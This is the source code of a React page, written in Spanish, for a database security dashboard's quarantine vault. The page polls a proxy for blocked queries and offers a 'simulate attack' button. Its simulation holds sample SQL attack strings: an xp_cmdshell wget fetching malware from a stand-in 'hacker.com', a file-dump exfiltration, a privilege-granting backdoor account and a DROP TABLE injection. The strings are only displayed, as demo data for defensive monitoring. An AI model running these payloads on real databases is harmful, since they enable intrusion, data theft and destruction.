import { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import api from '../services/api';
import { loadDatabaseConnections } from '../services/databaseConnections';
import { AlertTriangle, ShieldCheck, Bug, Trash2, RefreshCcw, Activity, Eye, Terminal, X } from 'lucide-react';

interface Threat {
    id: number | string;
    clientDatabaseId: number;
    tableName: string;
    recordPk: string;
    threatType: string;
    isQuarantined: boolean;
    date: string;
    payload?: string;
    source?: 'proxy' | 'simulation';
    username?: string;
    origin?: string;
}

export default function Quarantine() {
    const [connections, setConnections] = useState<any[]>([]);
    const [proxyDatabase, setProxyDatabase] = useState('');
    const [connectionsError, setConnectionsError] = useState('');
    const [proxyThreats, setProxyThreats] = useState<Threat[]>([]);
    useEffect(() => {
        let cancelled = false;
        loadDatabaseConnections().then(({ databases }) => {
            if (cancelled) return;
            const active = databases.filter(db => db.active);
            setConnections(active);
            setProxyDatabase(active.length ? String(active[0].id) : '');
        }).catch(() => { if (!cancelled) setConnectionsError('No se pudieron cargar las bases para consultar sus bloqueos.'); });
        return () => { cancelled = true; };
    }, []);
    useEffect(() => {
        setProxyThreats([]);
        if (!proxyDatabase) return;
        let cancelled = false;
        const controller = new AbortController();
        let timer: ReturnType<typeof setTimeout>;
        const poll = async () => {
            try {
                const {data} = await api.get('/dam/protection', {params:{databaseId:proxyDatabase},signal:controller.signal});
                if (!cancelled) {
                    setConnectionsError('');
                    setProxyThreats(data.events.map((event:any) => ({id:`proxy:${proxyDatabase}:${event.id}`,clientDatabaseId:Number(proxyDatabase),tableName:'No registrada',recordPk:'',threatType:event.rule,isQuarantined:true,date:new Date(event.timestamp).toLocaleString(),source:'proxy',username:event.username,origin:event.origin,payload:JSON.stringify({fecha:event.timestamp,base:data.databaseName,usuario:event.username,origen:event.origin,motivo:event.rule},null,2)})));
                }
            } catch { if (!cancelled) {setProxyThreats([]);setConnectionsError('No se pudieron consultar los bloqueos reales de esta base.');} }
            if (!cancelled) timer=setTimeout(poll,2000);
        };
        void poll();
        return () => {cancelled=true;controller.abort();clearTimeout(timer);};
    }, [proxyDatabase]);
    const [threats, setThreats] = useState<Threat[]>(() => {
        const saved = localStorage.getItem('quarantine_threats');
        return saved ? JSON.parse(saved) : [];
    });
    const { role, setDamEvents } = useAuth();
    const isAdmin = role === 'ADMIN_DBA' || role === 'ROLE_ADMIN_DBA';
    
    const [confirmDialog, setConfirmDialog] = useState({
        isOpen: false,
        title: '',
        message: '',
        isDanger: false,
        onConfirm: () => {}
    });

    const [selectedThreat, setSelectedThreat] = useState<Threat | null>(null);

    useEffect(() => {
        localStorage.setItem('quarantine_threats', JSON.stringify(threats));
    }, [threats]);

    const handleRestore = (id: number | string, pk: string) => {
        setConfirmDialog({
            isOpen: true,
            title: 'Restaurar Registro',
            message: `¿Deseas retirar el registro local PK:${pk} de esta lista? Esta acción solo modifica los registros del navegador.`,
            isDanger: false,
            onConfirm: () => {
                setThreats(prev => prev.filter(t => t.id !== id));
                setConfirmDialog(prev => ({ ...prev, isOpen: false }));
            }
        });
    };

    const handlePurge = (id: number | string, pk: string) => {
        setConfirmDialog({
            isOpen: true,
            title: 'Depuración Irreversible',
            message: `¿Deseas eliminar el registro local PK:${pk} de esta lista? No elimina datos de la base de origen.`,
            isDanger: true,
            onConfirm: () => {
                setThreats(prev => prev.filter(t => t.id !== id));
                setConfirmDialog(prev => ({ ...prev, isOpen: false }));
            }
        });
    };

    const simulateAttack = () => {
        const attackPayloads: Record<string, string> = {
            'INYECCIÓN COMANDOS SO': "EXEC xp_cmdshell('wget http://hacker.com/malware.exe');",
            'MALWARE EN BLOB (TIKA)': "INSERT INTO archivos (data) VALUES (x'4D5A9000030000000400...');",
            'EXFILTRACIÓN DATOS': "SELECT * FROM usuarios INTO OUTFILE '/var/www/html/dump.csv';",
            'EVASIÓN DE PRIVILEGIOS': "GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY '1234';",
            'INYECCIÓN SQL CLÁSICA': "SELECT * FROM usuarios WHERE email = 'a@b.com' OR 1=1; DROP TABLE pagos;--"
        };

        const typeKeys = Object.keys(attackPayloads);
        const selectedType = typeKeys[Math.floor(Math.random() * typeKeys.length)];
        const tables = ['usuarios', 'pagos', 'facturas', 'empleados', 'sesiones'];
        const ips = ['185.15.2.4', '45.22.11.90', '192.168.1.5', '110.55.22.1'];
        
        const payload = attackPayloads[selectedType];

        const newThreat: Threat = {
            id: Date.now(),
            clientDatabaseId: Math.floor(Math.random() * 5) + 1,
            tableName: tables[Math.floor(Math.random() * tables.length)],
            recordPk: `USR-${Math.floor(Math.random() * 9000) + 1000}`,
            threatType: selectedType,
            payload: payload,
            isQuarantined: true,
            date: new Date().toLocaleTimeString()
            ,source: 'simulation'
        };
        
        setThreats(prev => [newThreat, ...prev]);

        // Reflejar la inyección maliciosa en el Monitor DAM (si está escuchando o aunque no lo esté para el log)
        setDamEvents(prev => [...prev.slice(-49), {
            id: Date.now() + Math.random(),
            username: 'hacker_anonymous',
            clientAddress: ips[Math.floor(Math.random() * ips.length)],
            state: 'blocked',
            query: payload,
            durationSeconds: parseFloat((Math.random() * 0.05).toFixed(3))
        }]);
    };

    return (
        <div style={{ display: 'flex', flexDirection: 'column', minHeight: '100%', fontFamily: 'sans-serif', position: 'relative' }}>
            
            {/* Modal de Carga Útil (Payload) */}
            {selectedThreat && (
                <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(4px)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 2000 }}>
                    <div style={{ background: 'white', borderRadius: '16px', width: '650px', boxShadow: '0 20px 40px rgba(0,0,0,0.3)', overflow: 'hidden', animation: 'zoomIn 0.3s ease-out' }}>
                        <div style={{ background: '#f8fafc', padding: '1.5rem 2rem', borderBottom: '1px solid #e2e8f0', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                            <h2 style={{ margin: 0, color: '#0f172a', display: 'flex', alignItems: 'center', gap: '10px', fontSize: '1.4rem' }}>
                                <Terminal size={26} color="#ef4444" />
                                Carga Útil Interceptada (Payload)
                            </h2>
                            <button onClick={() => setSelectedThreat(null)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#64748b' }}>
                                <X size={24} />
                            </button>
                        </div>
                        <div style={{ padding: '2rem' }}>
                            <p style={{ margin: '0 0 15px 0', color: '#475569', fontSize: '1rem', lineHeight: '1.5' }}>
                                {selectedThreat.source === 'proxy' ? 'Detalles del bloqueo real. El proxy no almacena el SQL completo ni identifica la tabla afectada.' : `Detalles del registro local de la tabla ${selectedThreat.tableName}.`}
                            </p>
                            <div style={{ background: '#020617', padding: '1.5rem', borderRadius: '8px', color: '#4ade80', fontFamily: 'monospace', fontSize: '0.95rem', overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all', border: '1px solid #334155' }}>
                                {selectedThreat.payload || '/* Payload binario encriptado o no disponible */'}
                            </div>
                        </div>
                        <div style={{ background: '#f8fafc', padding: '1rem 2rem', borderTop: '1px solid #e2e8f0', textAlign: 'right' }}>
                            <button onClick={() => setSelectedThreat(null)} style={{ background: '#3b82f6', color: 'white', border: 'none', padding: '10px 25px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '1rem' }}>
                                Entendido
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Modal de Confirmación para DBA */}
            {confirmDialog.isOpen && (
                <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(0,0,0,0.5)', backdropFilter: 'blur(4px)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 }}>
                    <div style={{ background: 'white', padding: '2.5rem', borderRadius: '16px', width: '420px', boxShadow: '0 20px 40px rgba(0,0,0,0.3)', textAlign: 'center' }}>
                        {confirmDialog.isDanger ? (
                            <AlertTriangle size={56} color="#ef4444" style={{ marginBottom: '15px' }} />
                        ) : (
                            <ShieldCheck size={56} color="#3b82f6" style={{ marginBottom: '15px' }} />
                        )}
                        <h2 style={{ margin: '0 0 10px 0', color: '#0f172a' }}>{confirmDialog.title}</h2>
                        <p style={{ color: '#475569', marginBottom: '2rem', lineHeight: '1.6', fontSize: '1.05rem' }}>
                            {confirmDialog.message}
                        </p>
                        <div style={{ display: 'flex', gap: '15px', justifyContent: 'center' }}>
                            <button 
                                onClick={confirmDialog.onConfirm} 
                                style={{ flex: 1, background: confirmDialog.isDanger ? '#ef4444' : '#10b981', color: 'white', border: 'none', padding: '12px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '1rem' }}
                            >
                                Aceptar
                            </button>
                            <button 
                                onClick={() => setConfirmDialog(prev => ({ ...prev, isOpen: false }))} 
                                style={{ flex: 1, background: '#e2e8f0', color: '#475569', border: 'none', padding: '12px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '1rem' }}
                            >
                                Cancelar
                            </button>
                        </div>
                    </div>
                </div>
            )}

            {/* Banner Superior Estilo Antivirus */}
            <div style={{ background: 'linear-gradient(90deg, #4c1d95 0%, #be123c 100%)', padding: '3.5rem 3rem', color: 'white', boxShadow: '0 4px 10px rgba(0,0,0,0.1)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                    <h1 style={{ margin: '0 0 10px 0', fontSize: '2rem', fontWeight: '400', display: 'flex', alignItems: 'center', gap: '10px' }}>
                        <Bug size={32} /> Bóveda de Cuarentena
                    </h1>
                    <p style={{ margin: 0, fontSize: '1.1rem', opacity: 0.9 }}>Bloqueos reales del proxy y registros locales en una sola tabla.</p>
                </div>
                
                {/* Botón de Simular Ataque */}
                <button 
                    onClick={simulateAttack}
                    style={{ background: 'rgba(255, 255, 255, 0.2)', border: '1px solid rgba(255,255,255,0.4)', color: 'white', padding: '12px 24px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '1rem', display: 'flex', alignItems: 'center', gap: '8px', backdropFilter: 'blur(5px)' }}
                >
                    <Activity size={20} /> Simular Ataque DB
                </button>
            </div>

            <div style={{ flex: 1, backgroundColor: '#f8fafc', padding: '3rem' }}>
                <section style={{ marginBottom: 20 }}>
                    <label htmlFor="quarantine-database" style={{display:'block',fontWeight:600,marginBottom:10}}>Base de datos: bloqueos del proxy</label>
                    <select id="quarantine-database" value={proxyDatabase} onChange={event=>setProxyDatabase(event.target.value)} disabled={!connections.length} style={{width:'100%',padding:12,border:'1px solid #cbd5e1',borderRadius:8,marginBottom:20}}>
                        {!connections.length && <option value="">No hay bases activas</option>}
                        {connections.map(db=><option key={db.id} value={db.id}>{db.name} — {db.host}</option>)}
                    </select>
                    {connectionsError && <p role="alert">{connectionsError}</p>}
                    <p style={{color:'#64748b'}}>Bloqueos reales de la base seleccionada y registros locales de este navegador. Actualización cada 2 segundos.</p>
                </section>
                <table style={{ width: '100%', background: 'white', borderRadius: '12px', overflow: 'hidden', borderCollapse: 'collapse', boxShadow: '0 4px 6px rgba(0,0,0,0.05)' }}>
                    <thead style={{ background: '#f1f5f9', textAlign: 'left', color: '#475569' }}>
                        <tr>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Hora</th>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>DB ID</th>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Tabla Afectada</th>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Tipo Amenaza</th>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Usuario / Origen</th>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Fuente</th>
                            <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Auditoría</th>
                            {isAdmin && <th style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>Acciones (DBA)</th>}
                        </tr>
                    </thead>
                    <tbody>
                        {[...proxyThreats, ...threats].map((t) => (
                            <tr key={t.id} style={{ transition: 'background 0.2s', animation: 'fadeIn 0.5s ease-in' }}>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0', color: '#64748b' }}>{t.date}</td>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0', fontWeight: 'bold' }}>DB-{t.clientDatabaseId}</td>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>{t.tableName}</td>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0', color: '#e11d48', fontWeight: 'bold' }}>{t.threatType}</td>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>{t.username || '—'}<br/>{t.origin || '—'}</td>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>{t.source==='proxy'?'Proxy · bloqueo real':t.source==='simulation'?'Simulación':'Registro local'}</td>
                                <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>
                                    <button 
                                        onClick={() => setSelectedThreat(t)} 
                                        style={{ display: 'inline-flex', alignItems: 'center', gap: '5px', background: '#eff6ff', color: '#3b82f6', border: '1px solid #bfdbfe', padding: '6px 12px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '0.85rem' }}
                                    >
                                        <Eye size={16} /> Inspeccionar
                                    </button>
                                </td>
                                {isAdmin && (
                                    <td style={{ padding: '1.2rem', borderBottom: '1px solid #e2e8f0' }}>
                                        {t.source === 'proxy' ? <span>Consulta bloqueada</span> : <div style={{ display: 'flex', gap: '8px' }}>
                                            <button 
                                                onClick={() => handleRestore(t.id, t.recordPk)} 
                                                title="Marcar como Falso Positivo"
                                                style={{ display: 'flex', alignItems: 'center', gap: '5px', background: '#dcfce3', color: '#10b981', border: 'none', padding: '6px 12px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '0.85rem' }}
                                            >
                                                <RefreshCcw size={16} />
                                            </button>
                                            <button 
                                                onClick={() => handlePurge(t.id, t.recordPk)} 
                                                title="Eliminar de forma irreversible"
                                                style={{ display: 'flex', alignItems: 'center', gap: '5px', background: '#fee2e2', color: '#ef4444', border: 'none', padding: '6px 12px', borderRadius: '50px', cursor: 'pointer', fontWeight: 'bold', fontSize: '0.85rem' }}
                                            >
                                                <Trash2 size={16} />
                                            </button>
                                        </div>}
                                    </td>
                                )}
                            </tr>
                        ))}
                        {threats.length === 0 && proxyThreats.length === 0 && (
                            <tr>
                                <td colSpan={isAdmin ? 8 : 7} style={{ padding: '4rem', textAlign: 'center', color: '#64748b' }}>
                                    <ShieldCheck size={64} color="#10b981" style={{ marginBottom: '15px', opacity: 0.5 }} />
                                    <h3 style={{ margin: 0, fontSize: '1.2rem' }}>No hay amenazas activas en cuarentena.</h3>
                                    <p style={{ margin: '5px 0 0 0' }}>No hay bloqueos disponibles ni registros locales en esta vista.</p>
                                </td>
                            </tr>
                        )}
                    </tbody>
                </table>
            </div>
            <style>
                {`
                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(-10px); background: #fee2e2; }
                    to { opacity: 1; transform: translateY(0); background: transparent; }
                }
                @keyframes zoomIn {
                    from { opacity: 0; transform: scale(0.95); }
                    to { opacity: 1; transform: scale(1); }
                }
                `}
            </style>
        </div>
    );
}
